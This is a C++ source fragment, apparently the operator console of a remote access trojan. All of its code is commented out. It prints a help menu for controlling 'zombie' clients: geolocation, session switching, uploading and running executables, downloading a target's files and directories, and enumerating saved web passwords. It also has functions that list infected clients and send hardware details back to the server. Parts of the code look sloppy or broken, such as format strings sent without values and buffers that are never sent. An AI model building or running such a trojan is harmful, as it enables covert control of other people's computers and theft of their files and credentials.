#include <Windows.h>
#include <iostream>
#include "Scripts_s.h"
#include "Scripts_all.h"
#include "Server.h"
#include "pch.h"

/*
void print_help()
{
	SetColor(2);
	std::cout << "				------------ List of Commands ------------" << std::endl;
	SetColor(6);
	std::cout << "help					     : list all commands" << std::endl;
	std::cout << "geo				         : Give the localization of the current session" << std::endl;
	std::cout << "getsysinfo				 : Give information about the current session (user ...)" << std::endl;
	std::cout << "set_session			     : Switch to an another session" << std::endl;
	std::cout << "list					     : list all actives sessions" << std::endl;
	std::cout << "exit					     : exit the program" << std::endl;
	std::cout << "pwd                        : print the trojan emplacement " << std::endl;
	std::cout << "cd \"\directory\..\"       : change directory" << std::endl;
	std::cout << "ls					     : see all files at the current directory" << std::endl;
	std::cout << "upload \"filename\"	     : upload a file in the current directory" << std::endl;
	std::cout << "upload_exe \"filename\"    : upload and exe a file in the current directory" << std::endl;
	std::cout << "download \"filename\"		 : download the file's target wanted  " << std::endl;
	std::cout << "download_dir \"filename\"  : download the target directory " << std::endl;
	std::cout << "enum_web 					 : enum all web passwords on the current session" << std::endl;
	SetColor(7);
}


void list(Server* server)
{
	std::cout << "[*] Enumming clients..." << std::endl;
	std::vector<st_Client> clients = server->getClients();
	for (int i = 0; i < clients.size(); i++)
	{
		std::cout << "Zombie " << clients[i].number;
	}
}
void getsysinfo(Server* server)
{
	char buffer[256] = { 0 };
	SYSTEM_INFO siSysInfo;

	// Copy the hardware information to the SYSTEM_INFO structure. 

	GetSystemInfo(&siSysInfo);

	// Display the contents of the SYSTEM_INFO structure. 

	server->send_b("Hardware information: \n");
	server->send_b("  OEM ID: %u\n");
	sprintf(buffer, "%d", siSysInfo.dwOemId);
	server->send_b(buffer);
	printf("  Number of processors: %u\n");
	sprintf(buffer, "%d", siSysInfo.dwNumberOfProcessors);
	server->send_b(buffer);
	server->send_b("  Page size: %u\n");
	sprintf(buffer, "%d", siSysInfo.dwPageSize);
	server->send_b(buffer);
	server->send_b("  Processor type: %u\n" );
	sprintf(buffer, "%d", siSysInfo.dwProcessorType);
	server->send_b("  Minimum application address: %lx\n");
	sprintf(buffer, "%d", siSysInfo.lpMinimumApplicationAddress);
	server->send_b("  Maximum application address: %lx\n");
	sprintf(buffer, "%d", siSysInfo.lpMaximumApplicationAddress);
	server->send_b("  Active processor mask: %u\n");
	sprintf(buffer, "%d", siSysInfo.dwActiveProcessorMask);

}

*/